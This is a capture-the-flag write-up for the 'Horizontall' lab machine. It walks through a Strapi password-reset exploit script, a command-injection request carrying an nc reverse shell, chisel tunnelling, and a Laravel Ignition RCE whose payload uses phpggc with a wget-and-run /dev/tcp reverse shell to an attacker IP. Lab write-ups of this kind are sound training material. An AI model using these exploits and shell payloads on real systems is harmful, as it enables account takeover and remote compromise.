![HORIZONTALL](banner.png)

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: horizontall
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Foothold

There is a webpage running on port 80. At first nothing interesting there but enumerating the files for a while we found something in `http://horizontall.htb/js/app.c68eb462.js`:
```js
getReviews:function(){var t=this;r.a.get("http://api-prod.horizontall.htb/reviews")
```

So there is a subdomain called `api-prod.horizontall.htb`.

Enumerating and using Dirbuster got us to a admin login page: `http://api-prod.horizontall.htb/admin/auth/login`

![strapi_login](strapi_login.png)

Let's get a closer look here. A quick web search showed us a [vulnerability](https://vuldb.com/de/?id.145231) for strapi.
We want to use the script `auth.py` mentioned [here](https://thatsn0tmysite.wordpress.com/2019/11/15/x05/):
```python
import requests
import sys
import json
 
args=sys.argv
 
if len(args) < 4:
    print("Usage: {} <admin_email> <url> <new_password>".format(args[0]))
    exit(-1)
 
email = args[1]
url = args[2]
new_password =  args[3]
 
s  =  requests.Session()


#version = json.loads(s.get("{}/admin/strapiVersion".format(url)).text)
 
#print("[*] Detected version(GET /admin/strapiVersion): {}".format(version["strapiVersion"]))
 
#Request password reset
print("[*] Sending password reset request...")
reset_request={"email":email, "url":"{}/admin/auth/reset-password".format(url)}
s.post("{}/".format(url), json=reset_request)
 
#Reset password to
print("[*] Setting new password...")
exploit={"code":{}, "password":new_password, "passwordConfirmation":new_password}
r=s.post("{}/admin/auth/reset-password".format(url), json=exploit)
 
print("[*] Response:")
print(str(r.content))
```
As you see we changed it a little bit. We need the right path to `/admin/auth/reset-password` and get rid of this version stuff as we don't need it.
The path `/admin/auth/reset-password` is guessed as the `forget-password` is also in there.
But we still need a valid admin-email. Using the `Forgot your password?`-functionality you can try random addresses. If the system doesn't know the email, it is going to tell you by `This email does not exist.` 
So we just tried some addresses and got lucky with one of our first attempts `admin@horizontall.htb` - there is no message shown at all.

So let's fire up the python code mentioned above like:
```bash
┌──(kali㉿kali)-[~/Desktop/horizontall]
└─$ python3 auth.py admin@horizontall.htb http://api-prod.horizontall.htb test1234
[*] Sending password reset request...
[*] Setting new password...
[*] Response:
b'{"jwt":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMwMTk1NDI1LCJleHAiOjE2MzI3ODc0MjV9.nkDpFc-zpOhw82pyLh5ZXnBjURuVOUYHSLQhcPji_yI","user":{"id":3,"username":"admin","email":"admin@horizontall.htb","blocked":null}}'
```
The tool tells us it has set a new password and even gives us the jwt.

Now you can login with `admin:test1234`:

![strapi_admin.png](strapi_admin.png)

## User

Strapi tells us it's running on version `Strapi v3.0.0-beta.17.4` (bottom-left corner).
We searched for exploits here and found [that one](https://bittherapy.net/post/strapi-framework-remote-code-execution/).

Rewriting the `curl`-command to our scenario leads us to this one:
```bash
curl --location --request POST 'http://api-prod.horizontall.htb/admin/plugins/install' \
--header 'Content-Type: application/json' \
--header 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMwMTk1NDI1LCJleHAiOjE2MzI3ODc0MjV9.nkDpFc-zpOhw82pyLh5ZXnBjURuVOUYHSLQhcPji_yI' \
--data-raw '{"plugin":"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.247 4444 >/tmp/f)","port":"80"}'
```

So let's set up a listener, fire it up and catch the shell. Don't forget to paste your own jwt as authorization-header though.
Your are logged in as `strapi` whats enough to get the `/home/developer/user.txt` on that machine.


## Root

Enumerating for a while we found another webpage running on port 8000:
```bash
[+] Active Ports
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                                                                                                                               
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                       
```

As we don't have access to that port with our attacker machine we used [chisel](https://github.com/jpillora/chisel).
After getting `chisel` on the target machine (e.g. `wget`) you can set it up with:

-	`chisel server -p 8000 --reverse` on attacker machine
-	`./chisel client 10.10.14.247:8000 R:80:127.0.0.1:8000` on target machine

Now you can see there is running `Laravel v8`:

![laravel.png](laravel.png)

A quick web search leaded us [here](https://github.com/ambionics/laravel-exploits).
To set this up we first need to get [phpgcc](https://github.com/ambionics/phpggc) too.

Set up a `rev.sh` like this and provide it:
```bash
#!/bin/bash
/bin/bash -i >& /dev/tcp/10.10.14.247/4242 0>&1
```

To create the payload you need to generate the `.phar` like this:
```bash
php -d'phar.readonly=0' ./phpggc --phar phar -f -o /tmp/exploit.phar monolog/rce1 system 'wget http://10.10.14.247:1234/rev.sh && chmod +x rev.sh && /bin/bash rev.sh'
```

Just set up a listener and hit:
```bash
python3 laravel-ignition-rce.py http://127.0.0.1/ /tmp/exploit.phar
```
to catch the root shell.






